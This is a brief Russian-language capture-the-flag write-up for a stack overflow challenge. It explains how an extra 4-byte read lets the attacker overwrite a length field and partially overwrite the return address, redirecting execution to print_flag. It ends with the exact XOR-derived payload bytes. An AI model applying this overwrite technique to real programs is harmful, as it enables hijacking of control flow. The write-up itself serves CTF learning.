формат "len_login:login:crypted_login\n"
считывает len_login, считывает len_login байт в login, и в crypted_login
в pass считывает на 4 байта больше, это дает возможность переписать len_login
делает цикличный xor login_crypted и pass

решение:
стэк: [12][4][16][16][8_align][4_ebp][return_addr]
мы контролируем len_login, поэтому можем переписать например только 2 байта из return_addr
тогда если
print_flag = 0x0804858c
ret_addr = 0x08048775
print_flag ^ ret_addr = 0x2f9 = \xf9\x02\x00\x00
то pass
\xf9\x02\xf9\x02\xf9\x02\xf9\x02\xf9\x02\xf9\x02\x1e\x00\x00\x00